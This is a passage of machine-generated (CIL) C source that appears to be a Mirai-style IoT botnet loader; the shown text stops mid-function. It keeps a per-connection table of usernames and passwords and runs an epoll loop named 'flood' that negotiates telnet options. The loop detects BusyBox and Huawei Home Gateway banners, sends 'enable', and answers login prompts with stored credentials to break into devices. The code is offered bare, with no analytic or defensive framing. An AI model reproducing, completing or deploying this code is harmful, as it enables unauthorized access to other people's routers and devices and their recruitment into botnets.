/* Generated by CIL v. 1.8.2 */
/* print_CIL_Input is true */

typedef unsigned long size_t;
typedef __builtin_va_list __gnuc_va_list;
typedef unsigned char __uint8_t;
typedef unsigned short __uint16_t;
typedef unsigned int __uint32_t;
typedef unsigned long __uint64_t;
typedef long __off_t;
typedef long __off64_t;
typedef long __time_t;
typedef unsigned int __useconds_t;
typedef long __ssize_t;
typedef unsigned int __socklen_t;
struct _IO_FILE ;
typedef struct _IO_FILE FILE;
struct _IO_marker ;
struct _IO_codecvt ;
struct _IO_wide_data ;
typedef void _IO_lock_t;
struct _IO_FILE {
   int _flags ;
   char *_IO_read_ptr ;
   char *_IO_read_end ;
   char *_IO_read_base ;
   char *_IO_write_base ;
   char *_IO_write_ptr ;
   char *_IO_write_end ;
   char *_IO_buf_base ;
   char *_IO_buf_end ;
   char *_IO_save_base ;
   char *_IO_backup_base ;
   char *_IO_save_end ;
   struct _IO_marker *_markers ;
   struct _IO_FILE *_chain ;
   int _fileno ;
   int _flags2 ;
   __off_t _old_offset ;
   unsigned short _cur_column ;
   signed char _vtable_offset ;
   char _shortbuf[1] ;
   _IO_lock_t *_lock ;
   __off64_t _offset ;
   struct _IO_codecvt *_codecvt ;
   struct _IO_wide_data *_wide_data ;
   struct _IO_FILE *_freeres_list ;
   void *_freeres_buf ;
   size_t __pad5 ;
   int _mode ;
   char _unused2[(15UL * sizeof(int ) - 4UL * sizeof(void *)) - sizeof(size_t )] ;
};
typedef __gnuc_va_list va_list___0;
typedef __ssize_t ssize_t;
typedef __time_t time_t;
struct __pthread_internal_list {
   struct __pthread_internal_list *__prev ;
   struct __pthread_internal_list *__next ;
};
typedef struct __pthread_internal_list __pthread_list_t;
struct __pthread_mutex_s {
   int __lock ;
   unsigned int __count ;
   int __owner ;
   unsigned int __nusers ;
   int __kind ;
   short __spins ;
   short __elision ;
   __pthread_list_t __list ;
};
typedef unsigned long pthread_t;
union __anonunion_pthread_mutexattr_t_488594144 {
   char __size[4] ;
   int __align ;
};
typedef union __anonunion_pthread_mutexattr_t_488594144 pthread_mutexattr_t;
union pthread_attr_t {
   char __size[56] ;
   long __align ;
};
typedef union pthread_attr_t pthread_attr_t;
union __anonunion_pthread_mutex_t_335460617 {
   struct __pthread_mutex_s __data ;
   char __size[40] ;
   long __align ;
};
typedef union __anonunion_pthread_mutex_t_335460617 pthread_mutex_t;
typedef __socklen_t socklen_t;
typedef unsigned short sa_family_t;
struct sockaddr {
   sa_family_t sa_family ;
   char sa_data[14] ;
};
struct linger {
   int l_onoff ;
   int l_linger ;
};
struct sockaddr_in ;
typedef __uint8_t uint8_t;
typedef __uint16_t uint16_t;
typedef __uint32_t uint32_t;
typedef __uint64_t uint64_t;
typedef uint32_t in_addr_t;
struct in_addr {
   in_addr_t s_addr ;
};
typedef uint16_t in_port_t;
struct sockaddr_in {
   sa_family_t sin_family ;
   in_port_t sin_port ;
   struct in_addr sin_addr ;
   unsigned char sin_zero[((sizeof(struct sockaddr ) - sizeof(unsigned short )) - sizeof(in_port_t )) - sizeof(struct in_addr )] ;
};
typedef void (*__sighandler_t)(int  );
struct tm {
   int tm_sec ;
   int tm_min ;
   int tm_hour ;
   int tm_mday ;
   int tm_mon ;
   int tm_year ;
   int tm_wday ;
   int tm_yday ;
   int tm_isdst ;
   long tm_gmtoff ;
   char const   *tm_zone ;
};
union epoll_data {
   void *ptr ;
   int fd ;
   uint32_t u32 ;
   uint64_t u64 ;
};
typedef union epoll_data epoll_data_t;
struct epoll_event {
   uint32_t events ;
   epoll_data_t data ;
} __attribute__((__packed__)) ;
struct stateSlot_t {
   int slotUsed ;
   pthread_mutex_t mutex ;
   unsigned char success ;
   unsigned char is_open ;
   unsigned char special ;
   unsigned char got_prompt ;
   uint8_t pathInd ;
   uint16_t echoInd ;
   int complete ;
   uint32_t ip ;
   int fd ;
   int updatedAt ;
   int reconnecting ;
   unsigned char state ;
   char path[5][32] ;
   char username[32] ;
   char password[32] ;
};
struct __anonstruct_binary_838077917 {
   int num_slices ;
   unsigned char **slices ;
};
#pragma merger("0","/tmp/cil-AAzEUdaM.i","-pthread")
/* compiler builtin:
   void __builtin_va_start(__builtin_va_list  ) ;  */
/* compiler builtin:
   void __builtin_va_end(__builtin_va_list  ) ;  */
/* compiler builtin:
   void __attribute__((__overloaded__))  __sync_fetch_and_add(...) ;  */
/* compiler builtin:
   void __attribute__((__overloaded__))  __sync_fetch_and_sub(...) ;  */
#pragma merger("0","/tmp/cil-V1Hh6Ccf.i","-pthread")
extern FILE *stdout ;
extern FILE *stderr ;
extern int fflush(FILE *__stream ) ;
extern FILE *fopen(char const   * __restrict  __filename , char const   * __restrict  __modes ) ;
extern int fprintf(FILE * __restrict  __stream , char const   * __restrict  __format
                   , ...) ;
extern int printf(char const   * __restrict  __format  , ...) ;
extern  __attribute__((__nothrow__)) int sprintf(char * __restrict  __s , char const   * __restrict  __format
                                                 , ...) ;
extern  __attribute__((__nothrow__)) int vsprintf(char * __restrict  __s , char const   * __restrict  __format ,
                                                  __gnuc_va_list __arg ) ;
extern char *fgets(char * __restrict  __s , int __n , FILE * __restrict  __stream ) ;
extern void perror(char const   *__s ) ;
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) atoi)(char const   *__nptr )  __attribute__((__pure__)) ;
extern  __attribute__((__nothrow__)) void *malloc(size_t __size )  __attribute__((__malloc__)) ;
extern  __attribute__((__nothrow__)) void *calloc(size_t __nmemb , size_t __size )  __attribute__((__malloc__)) ;
extern  __attribute__((__nothrow__)) void free(void *__ptr ) ;
extern  __attribute__((__nothrow__, __noreturn__)) void exit(int __status ) ;
extern int close(int __fd ) ;
extern ssize_t read(int __fd , void *__buf , size_t __nbytes ) ;
extern unsigned int sleep(unsigned int __seconds ) ;
extern int usleep(__useconds_t __useconds ) ;
extern  __attribute__((__nothrow__)) void *( __attribute__((__nonnull__(1))) memset)(void *__s ,
                                                                                     int __c ,
                                                                                     size_t __n ) ;
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1,2))) memcmp)(void const   *__s1 ,
                                                                                     void const   *__s2 ,
                                                                                     size_t __n )  __attribute__((__pure__)) ;
extern  __attribute__((__nothrow__)) void *( __attribute__((__nonnull__(1))) memchr)(void const   *__s ,
                                                                                     int __c ,
                                                                                     size_t __n )  __attribute__((__pure__)) ;
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1,2))) strcpy)(char * __restrict  __dest ,
                                                                                       char const   * __restrict  __src ) ;
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1,2))) strncpy)(char * __restrict  __dest ,
                                                                                        char const   * __restrict  __src ,
                                                                                        size_t __n ) ;
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1,2))) strncat)(char * __restrict  __dest ,
                                                                                        char const   * __restrict  __src ,
                                                                                        size_t __n ) ;
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1))) strdup)(char const   *__s )  __attribute__((__malloc__)) ;
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1))) strchr)(char const   *__s ,
                                                                                     int __c )  __attribute__((__pure__)) ;
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1,2))) strstr)(char const   *__haystack ,
                                                                                       char const   *__needle )  __attribute__((__pure__)) ;
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1,2))) strcasestr)(char const   *__haystack ,
                                                                                           char const   *__needle )  __attribute__((__pure__)) ;
 __attribute__((__nothrow__)) void *( __attribute__((__nonnull__(1,3))) memmem)(void const   *l ,
                                                                                unsigned long l_len ,
                                                                                void const   *s ,
                                                                                unsigned long s_len )  __attribute__((__pure__)) ;
extern  __attribute__((__nothrow__)) size_t ( __attribute__((__nonnull__(1))) strlen)(char const   *__s )  __attribute__((__pure__)) ;
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1,2))) strsep)(char ** __restrict  __stringp ,
                                                                                       char const   * __restrict  __delim ) ;
extern  __attribute__((__nothrow__)) int socket(int __domain , int __type , int __protocol ) ;
extern  __attribute__((__nothrow__)) int bind(int __fd , struct sockaddr  const  * __restrict  __addr ,
                                              socklen_t __len ) ;
extern int connect(int __fd , struct sockaddr  const  * __restrict  __addr , socklen_t __len ) ;
extern ssize_t send(int __fd , void const   *__buf , size_t __n , int __flags ) ;
extern ssize_t recv(int __fd , void *__buf , size_t __n , int __flags ) ;
extern  __attribute__((__nothrow__)) int getsockopt(int __fd , int __level , int __optname ,
                                                    void * __restrict  __optval ,
                                                    socklen_t * __restrict  __optlen ) ;
extern  __attribute__((__nothrow__)) int setsockopt(int __fd , int __level , int __optname ,
                                                    void const   *__optval , socklen_t __optlen ) ;
extern  __attribute__((__nothrow__)) int shutdown(int __fd , int __how ) ;
extern  __attribute__((__nothrow__)) uint16_t htons(uint16_t __hostshort )  __attribute__((__const__)) ;
extern  __attribute__((__nothrow__)) __sighandler_t signal(int __sig , void (*__handler)(int  ) ) ;
extern int fcntl(int __fd , int __cmd  , ...) ;
extern int ( __attribute__((__nonnull__(1))) open)(char const   *__file , int __oflag
                                                   , ...) ;
extern  __attribute__((__nothrow__)) int *__errno_location(void)  __attribute__((__const__)) ;
extern  __attribute__((__nothrow__)) in_addr_t inet_addr(char const   *__cp ) ;
extern  __attribute__((__nothrow__)) time_t time(time_t *__timer ) ;
extern  __attribute__((__nothrow__)) size_t strftime(char * __restrict  __s , size_t __maxsize ,
                                                     char const   * __restrict  __format ,
                                                     struct tm  const  * __restrict  __tp ) ;
extern  __attribute__((__nothrow__)) struct tm *localtime(time_t const   *__timer ) ;
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1,3))) pthread_create)(pthread_t * __restrict  __newthread ,
                                                                                             pthread_attr_t const   * __restrict  __attr ,
                                                                                             void *(*__start_routine)(void * ) ,
                                                                                             void * __restrict  __arg ) ;
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) pthread_mutex_init)(pthread_mutex_t *__mutex ,
                                                                                               pthread_mutexattr_t const   *__mutexattr ) ;
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) pthread_mutex_lock)(pthread_mutex_t *__mutex ) ;
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1))) pthread_mutex_unlock)(pthread_mutex_t *__mutex ) ;
extern  __attribute__((__nothrow__)) int epoll_create(int __size ) ;
extern  __attribute__((__nothrow__)) int epoll_ctl(int __epfd , int __op , int __fd ,
                                                   struct epoll_event *__event ) ;
extern int epoll_wait(int __epfd , struct epoll_event *__events , int __maxevents ,
                      int __timeout ) ;
static char *bind_ip  =    (char *)"0.0.0.0";
static unsigned char debug_mode  =    (unsigned char)0;
static int maxConnectedSockets  =    0;
int volatile   running_threads  =    (int volatile   )0;
unsigned long volatile   found_srvs  =    (unsigned long volatile   )0;
unsigned int volatile   bytes_sent  =    (unsigned int volatile   )0;
unsigned long volatile   timed_out  =    (unsigned long volatile   )0;
unsigned long volatile   login_done  =    (unsigned long volatile   )0;
unsigned long volatile   failed_connect  =    (unsigned long volatile   )0;
unsigned long volatile   remote_hangup  =    (unsigned long volatile   )0;
unsigned short volatile   port  =    (unsigned short volatile   )0;
unsigned int volatile   maxFDSaw  =    (unsigned int volatile   )0;
FILE *infd  ;
char *run_arg  =    (char *)((void *)0);
static int epollFD  ;
struct __anonstruct_binary_838077917 binary  ;
struct stateSlot_t stateTable[1]  = {      {0, {{0, 0U, 0, 0U, 0, (short)0, (short)0, {(struct __pthread_internal_list *)0,
                                                 (struct __pthread_internal_list *)0}}},
      (unsigned char)0, (unsigned char)0, (unsigned char)0, (unsigned char)0, (unsigned char)0,
      (unsigned short)0, 0, 0U, 0, 0, 0, (unsigned char)0, {{(char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0}, {(char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0},
                                                            {(char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0}, {(char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0,
                                                                                 (char)0},
                                                            {(char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0, (char)0,
                                                             (char)0, (char)0}}, {(char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0,
                                                                                  (char)0},
      {(char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0,
       (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0,
       (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0, (char)0,
       (char)0, (char)0, (char)0, (char)0, (char)0}}};
int matchPrompt(char *bufStr )
{
  int i ;
  int q ;
  char *prompts ;
  char *tmpStr ;
  size_t tmp ;
  void *tmp___0 ;
  size_t tmp___1 ;
  char in_escape ;
  char *tmp___2 ;
  size_t tmp___3 ;
  int bufLen ;
  size_t tmp___4 ;
  size_t tmp___5 ;

  {
  i = 0;
  q = 0;
  prompts = (char *)":>%$#";
  tmp = strlen((char const   *)bufStr);
  tmp___0 = malloc(tmp + 1UL);
  tmpStr = (char *)tmp___0;
  tmp___1 = strlen((char const   *)bufStr);
  memset((void *)tmpStr, 0, tmp___1 + 1UL);
  in_escape = (char)0;
  i = 0;
  while (1) {
    tmp___3 = strlen((char const   *)bufStr);
    if (! ((size_t )i < tmp___3)) {
      break;
    }
    if ((int )*(bufStr + i) == 27) {
      if ((int )in_escape == 0) {
        in_escape = (char)1;
      }
    } else
    if ((int )in_escape == 1) {
      tmp___2 = strchr("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", (int )*(bufStr + i));
      if ((unsigned long )tmp___2 != (unsigned long )((void *)0)) {
        in_escape = (char)0;
      } else {
        goto _L;
      }
    } else
    _L: /* CIL Label */
    if ((int )in_escape == 0) {
      strncat((char * __restrict  )tmpStr, (char const   * __restrict  )(bufStr + i),
              (size_t )1);
    }
    i ++;
  }
  tmp___4 = strlen((char const   *)tmpStr);
  bufLen = (int )tmp___4;
  i = 0;
  while (1) {
    tmp___5 = strlen((char const   *)prompts);
    if (! ((size_t )i < tmp___5)) {
      break;
    }
    while (1) {
      if (bufLen > q) {
        if (! ((int )*((tmpStr + bufLen) - q) == 0)) {
          if (! ((int )*((tmpStr + bufLen) - q) == 32)) {
            if (! ((int )*((tmpStr + bufLen) - q) == 13)) {
              if (! ((int )*((tmpStr + bufLen) - q) == 10)) {
                break;
              }
            }
          }
        }
      } else {
        break;
      }
      q ++;
    }
    if ((int )*((tmpStr + bufLen) - q) == (int )*(prompts + i)) {
      free((void *)tmpStr);
      return (1);
    }
    i ++;
  }
  free((void *)tmpStr);
  return (0);
}
}
void hexDump(char *desc , void *addr , int len )
{
  int i ;
  unsigned char buff[17] ;
  unsigned char *pc ;

  {
  pc = (unsigned char *)addr;
  if ((unsigned long )desc != (unsigned long )((void *)0)) {
    printf((char const   * __restrict  )"%s:\n", desc);
  }
  i = 0;
  while (i < len) {
    if (i % 16 == 0) {
      if (i != 0) {
        printf((char const   * __restrict  )"  %s\n", buff);
      }
      printf((char const   * __restrict  )"  %04x ", i);
    }
    printf((char const   * __restrict  )" %02x", (int )*(pc + i));
    if ((int )*(pc + i) < 32) {
      buff[i % 16] = (unsigned char )'.';
    } else
    if ((int )*(pc + i) > 126) {
      buff[i % 16] = (unsigned char )'.';
    } else {
      buff[i % 16] = *(pc + i);
    }
    buff[i % 16 + 1] = (unsigned char )'\000';
    i ++;
  }
  while (i % 16 != 0) {
    printf((char const   * __restrict  )"   ");
    i ++;
  }
  printf((char const   * __restrict  )"  %s\n", buff);
  return;
}
}
int log_recv(int sock , void *buf , int len , int flags )
{
  int ret ;
  ssize_t tmp ;
  int i ;
  char hex_buf[32] ;
  unsigned int tmp___0 ;

  {
  memset(buf, 0, (size_t )len);
  tmp = recv(sock, buf, (size_t )len, flags);
  ret = (int )tmp;
  if (ret > 0) {
    i = 0;
    i = 0;
    while (i < ret) {
      if ((int )*((char *)buf + i) == 0) {
        *((char *)buf + i) = (char )'A';
      }
      i ++;
    }
  }
  if (debug_mode) {
    hex_buf[0] = (char)0;
    tmp___0 = 1U;
    while (! (tmp___0 >= 32U)) {
      hex_buf[tmp___0] = (char)0;
      tmp___0 ++;
    }
    sprintf((char * __restrict  )(hex_buf), (char const   * __restrict  )"state %d - recv: %d",
            (int )stateTable[sock].state, ret);
    if (ret != -1) {
      hexDump(hex_buf, buf, ret);
    } else {
      printf((char const   * __restrict  )"%s\n", hex_buf);
    }
  }
  return (ret);
}
}
int log_send(int sock , void *buf , int len , int flags )
{
  char hex_buf[32] ;
  unsigned int tmp ;
  ssize_t tmp___0 ;

  {
  if (debug_mode) {
    hex_buf[0] = (char)0;
    tmp = 1U;
    while (! (tmp >= 32U)) {
      hex_buf[tmp] = (char)0;
      tmp ++;
    }
    sprintf((char * __restrict  )(hex_buf), (char const   * __restrict  )"state %d - send: %d",
            (int )stateTable[sock].state, len);
    hexDump(hex_buf, buf, len);
  }
  bytes_sent += (unsigned int volatile   )len;
  tmp___0 = send(sock, (void const   *)buf, (size_t )len, flags);
  return ((int )tmp___0);
}
}
int sockprintf(int sock , char *formatStr  , ...)
{
  char textBuffer[2048] ;
  unsigned int tmp ;
  va_list___0 args ;
  int q ;
  size_t tmp___0 ;
  int tmp___1 ;

  {
  textBuffer[0] = (char)0;
  tmp = 1U;
  while (! (tmp >= 2048U)) {
    textBuffer[tmp] = (char)0;
    tmp ++;
  }
  memset((void *)(textBuffer), 0, (size_t )2048);
  __builtin_va_start(args, formatStr);
  vsprintf((char * __restrict  )(textBuffer), (char const   * __restrict  )formatStr,
           args);
  __builtin_va_end(args);
  tmp___0 = strlen((char const   *)(textBuffer));
  tmp___1 = log_send(sock, (void *)(textBuffer), (int )tmp___0, 16384);
  q = tmp___1;
  return (q);
}
}
 __attribute__((__nothrow__)) void *( __attribute__((__nonnull__(1,3))) memmem)(void const   *l ,
                                                                                unsigned long l_len ,
                                                                                void const   *s ,
                                                                                unsigned long s_len )  __attribute__((__pure__)) ;
void *( __attribute__((__nonnull__(1,3))) memmem)(void const   *l , unsigned long l_len ,
                                                  void const   *s , unsigned long s_len )
{
  register char *cur ;
  register char *last ;
  char const   *cl ;
  char const   *cs ;
  void *tmp ;
  int tmp___0 ;

  {
  cl = (char const   *)l;
  cs = (char const   *)s;
  if (l_len == 0UL) {
    return ((void *)0);
  } else
  if (s_len == 0UL) {
    return ((void *)0);
  }
  if (l_len < s_len) {
    return ((void *)0);
  }
  if (s_len == 1UL) {
    tmp = memchr(l, (int )*cs, l_len);
    return (tmp);
  }
  last = ((char *)cl + l_len) - s_len;
  cur = (char *)cl;
  while ((unsigned long )cur <= (unsigned long )last) {
    if ((int )*(cur + 0) == (int )*(cs + 0)) {
      tmp___0 = memcmp((void const   *)cur, (void const   *)cs, s_len);
      if (tmp___0 == 0) {
        return ((void *)cur);
      }
    }
    cur ++;
  }
  return ((void *)0);
}
}
void handle_remote_closed(int fd )
{


  {
  remote_hangup += (unsigned long volatile   )1;
  return;
}
}
void handle_timeout(int fd )
{


  {
  timed_out += (unsigned long volatile   )1;
  return;
}
}
void handle_failed_connect(int fd )
{


  {
  failed_connect += (unsigned long volatile   )1;
  return;
}
}
void handle_found(int fd )
{


  {
  found_srvs += (unsigned long volatile   )1;
  return;
}
}
void closeAndCleanup(int fd )
{
  struct linger linger ;

  {
  if (stateTable[fd].slotUsed) {
    if (stateTable[fd].fd == fd) {
      stateTable[fd].slotUsed = 0;
      stateTable[fd].state = (unsigned char)0;
      stateTable[fd].path[0][0] = (char)0;
      stateTable[fd].path[1][0] = (char)0;
      stateTable[fd].path[2][0] = (char)0;
      stateTable[fd].path[3][0] = (char)0;
      stateTable[fd].path[4][0] = (char)0;
      stateTable[fd].username[0] = (char)0;
      stateTable[fd].password[0] = (char)0;
      stateTable[fd].echoInd = (uint16_t )0;
      stateTable[fd].pathInd = (uint8_t )0;
      stateTable[fd].success = (unsigned char)0;
      stateTable[fd].special = (unsigned char)0;
      stateTable[fd].got_prompt = (unsigned char)0;
      if (stateTable[fd].is_open) {
        stateTable[fd].is_open = (unsigned char)0;
        shutdown(fd, 2);
        linger.l_onoff = 1;
        linger.l_linger = 0;
        setsockopt(fd, 1, 13, (void const   *)((char *)(& linger)), (socklen_t )sizeof(linger));
        close(fd);
      }
    }
  }
  return;
}
}
void updateAccessTime(int fd )
{
  time_t tmp ;

  {
  if (stateTable[fd].slotUsed) {
    if (stateTable[fd].fd == fd) {
      tmp = time((time_t *)((void *)0));
      stateTable[fd].updatedAt = (int )tmp;
    }
  }
  return;
}
}
int getConnectedSockets(void)
{
  int q ;
  int i ;

  {
  q = 0;
  i = 0;
  q = 0;
  while ((unsigned int volatile   )q < maxFDSaw) {
    if (stateTable[q].slotUsed) {
      i ++;
    }
    q ++;
  }
  return (i);
}
}
void *flood(void *par1 )
{
  unsigned char buf[10241] ;
  unsigned int tmp ;
  struct epoll_event pevents[25] ;
  unsigned int tmp___0 ;
  int ret ;
  int i ;
  int got ;
  int ii ;
  struct stateSlot_t *state ;
  int is_closed ;
  struct stateSlot_t *state___0 ;
  int old_state ;
  unsigned char tmp1[3] ;
  unsigned char tmp2[9] ;
  void *tmp___1 ;
  void *tmp___2 ;
  void *tmp___3 ;
  void *tmp___4 ;
  int tmp___5 ;
  void *tmp___6 ;
  int tmp___7 ;
  char *tmp___8 ;
  char *tmp___9 ;
  char *tmp___10 ;
  char *tmp___11 ;
  char *tmp___12 ;
  int tmp___13 ;
  int tmp___14 ;
  char *tmp___15 ;
  int tmp___16 ;
  char *tmp_buf ;
  char *start ;
  char *space ;
  int memes ;
  char *tmp___18 ;
  char *tmp___19 ;
  char *tmp___20 ;
  int iii ;
  char *tmp___21 ;
  char *tmp___22 ;
  size_t tmp___23 ;
  int tmp___24 ;
  char *tmp___25 ;
  char *tmp___26 ;
  size_t tmp___27 ;
  int tmp___28 ;
  char *tmp___29 ;
  uint16_t tmp___30 ;
  char *tmp___31 ;
  char *tmp___32 ;
  char *tmp___33 ;
  int tmp___34 ;
  void *tmp___35 ;
  int tmp___36 ;
  struct epoll_event event ;
  struct stateSlot_t *state___1 ;
  int so_error ;
  socklen_t len ;
  int *tmp___37 ;

  {
  __sync_fetch_and_add(& running_threads, 1);
  buf[0] = (unsigned char)0;
  tmp = 1U;
  while (! (tmp >= 10241U)) {
    buf[tmp] = (unsigned char)0;
    tmp ++;
  }
  pevents[0].events = (uint32_t )0;
  pevents[0].data.ptr = (void *)0;
  tmp___0 = 1U;
  while (! (tmp___0 >= 25U)) {
    pevents[tmp___0].events = 0U;
    pevents[tmp___0].data.ptr = (void *)0;
    tmp___0 ++;
  }
  ret = 0;
  i = 0;
  got = 0;
  ii = 0;
  while (1) {
    ret = epoll_wait(epollFD, pevents, 25, 10000);
    if (! (ret >= 0)) {
      if (ret == -1) {
        tmp___37 = __errno_location();
        if (! (*tmp___37 == 4)) {
          break;
        }
      } else {
        break;
      }
    }
    if (ret == 0) {
      continue;
    }
    i = 0;
    while (i < ret) {
      if (pevents[i].events & 8U) {
        goto _L___0;
      } else
      if (pevents[i].events & 16U) {
        goto _L___0;
      } else
      if (pevents[i].events & 8192U) {
        goto _L___0;
      } else
      if (! (pevents[i].events & 1U)) {
        if (! (pevents[i].events & 4U)) {
          _L___0: /* CIL Label */
          state = & stateTable[pevents[i].data.fd];
          if ((int )state->state == 0) {
            handle_failed_connect(state->fd);
          } else {
            handle_remote_closed(state->fd);
          }
          pthread_mutex_lock(& state->mutex);
          closeAndCleanup(state->fd);
          pthread_mutex_unlock(& state->mutex);
        } else {
          goto _L___1;
        }
      } else
      _L___1: /* CIL Label */
      if (pevents[i].events & 1U) {
        is_closed = 0;
        state___0 = & stateTable[pevents[i].data.fd];
        memset((void *)(buf), 0, (size_t )10241);
        pthread_mutex_lock(& state___0->mutex);
        old_state = (int )state___0->state;
        got = 0;
        while (1) {
          if ((int )state___0->state == 1) {
            got = log_recv(state___0->fd, (void *)(buf), 1, 2);
            if (got > 0) {
              if ((int )buf[0] == 255) {
                state___0->state = (unsigned char)2;
              }
            }
            if (got > 0) {
              if ((int )buf[0] != 255) {
                state___0->state = (unsigned char)3;
              }
            }
          }
          if ((int )state___0->state == 2) {
            log_recv(state___0->fd, (void *)(buf), 1, 0);
            got = log_recv(state___0->fd, (void *)(buf + 1), 2, 0);
            if (got > 0) {
              state___0->state = (unsigned char)1;
              if ((int )buf[1] == 253) {
                if ((int )buf[2] == 31) {
                  tmp1[0] = (unsigned char)255;
                  tmp1[1] = (unsigned char)251;
                  tmp1[2] = (unsigned char)31;
                  log_send(state___0->fd, (void *)(tmp1), 3, 16384);
                  tmp2[0] = (unsigned char)255;
                  tmp2[1] = (unsigned char)250;
                  tmp2[2] = (unsigned char)31;
                  tmp2[3] = (unsigned char)0;
                  tmp2[4] = (unsigned char)80;
                  tmp2[5] = (unsigned char)0;
                  tmp2[6] = (unsigned char)24;
                  tmp2[7] = (unsigned char)255;
                  tmp2[8] = (unsigned char)240;
                  log_send(state___0->fd, (void *)(tmp2), 9, 16384);
                  goto __Cont;
                }
              }
              ii = 0;
              while (ii < 3) {
                if ((int )buf[ii] == 253) {
                  buf[ii] = (unsigned char)252;
                } else
                if ((int )buf[ii] == 251) {
                  buf[ii] = (unsigned char)253;
                }
                ii ++;
              }
              log_send(state___0->fd, (void *)(buf), 3, 16384);
            }
          }
          __Cont: /* CIL Label */
          if (got > 0) {
            if (! ((int )state___0->state != 3)) {
              break;
            }
          } else {
            break;
          }
        }
        if ((int )state___0->state == 3) {
          while (1) {
            got = log_recv(state___0->fd, (void *)(buf), 10240, 0);
            if (! (got > 0)) {
              break;
            }
            tmp___1 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"Huawei Home Gateway",
                             19UL);
            if ((unsigned long )tmp___1 != (unsigned long )((void *)0)) {
              state___0->special = (unsigned char)1;
            }
            tmp___2 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"BusyBox",
                             7UL);
            if ((unsigned long )tmp___2 != (unsigned long )((void *)0)) {
              state___0->got_prompt = (unsigned char)1;
              sockprintf(state___0->fd, (char *)"enable\r\n");
              state___0->state = (unsigned char)7;
              break;
            }
            tmp___3 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"ogin",
                             4UL);
            if ((unsigned long )tmp___3 != (unsigned long )((void *)0)) {
              state___0->got_prompt = (unsigned char)1;
              sockprintf(state___0->fd, (char *)"%s\r\n", state___0->username);
              state___0->state = (unsigned char)4;
              break;
            } else {
              tmp___4 = memmem((void const   *)(buf), (unsigned long )got, (void const   *)"sername",
                               7UL);
